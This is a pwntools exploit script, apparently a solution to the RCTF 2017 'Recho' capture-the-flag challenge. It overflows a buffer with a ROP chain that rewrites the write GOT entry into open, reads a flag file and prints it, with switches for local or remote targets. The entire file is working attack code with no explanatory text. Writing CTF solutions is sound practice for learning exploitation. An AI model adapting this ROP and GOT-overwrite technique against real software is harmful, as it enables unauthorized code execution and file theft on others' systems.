# RCTF_2017
from pwn import *

os.environ['LD_PRELOAD'] = './libc.so.6'
local = 1
e = ELF('./Recho')
libc = ELF('./libc.so.6')
prax = 0x00000000004006fc
prdi = 0x00000000004008a3
prdx = 0x00000000004006fe
prsi_p = 0x00000000004008a1
add_func = 0x000000000040070d #: add byte ptr [rdi], al ; ret
buf = 0x601100

if local:
    r = process('./Recho2')
else:
    r = remote('recho.2017.teamrois.cn', 9527)

def packAll(rop):
    return flat([p64(x) for x in rop])

r.sendlineafter('Welcome to Recho server!\n', str(0x400))

# leak libc version
# rop = []
# rop += [prdi, 1]
# rop += [prsi_p, e.got['alarm'], 1]
# rop += [prdx, 8]
# rop += [e.plt['write']]
# 
# rop = 'A'*(0x30+0x8) + packAll(rop)
# r.sendline(rop)
# raw_input('>>')
# r.shutdown('send')
# time.sleep(0.5)
# print hex(u64(r.recv(100)[-8:]))

print hex(libc.symbols['write'])
print hex(libc.symbols['open'])
# turn write to open
rop = []
rop += [prdi, e.got['write']]
rop += [prax, 0x80]
rop += [add_func]
rop += [prdi, e.got['write']+1]
rop += [prax, 0xfe]
rop += [add_func]

# open `flag`
rop += [prdi, e.symbols['flag']]
rop += [prsi_p, 0, 0]
rop += [e.plt['write']]

# turn open to write
rop += [prdi, e.got['write']]
rop += [prax, 0x80]
rop += [add_func]
rop += [prdi, e.got['write']+1]
rop += [prax, 0x2]
rop += [add_func]

# read content of flag to buf
rop += [prsi_p, buf, 0]
rop += [prdi, 3]
rop += [prdx, 0x10]
rop += [e.plt['read']]

# write to stdout
rop += [prsi_p, buf, 0]
rop += [prdi, 1]
rop += [prdx, 0x10]
rop += [e.plt['write']]


r.sendline('A'*0x38 + packAll(rop))
raw_input('>>')
r.shutdown('send')
r.interactive()
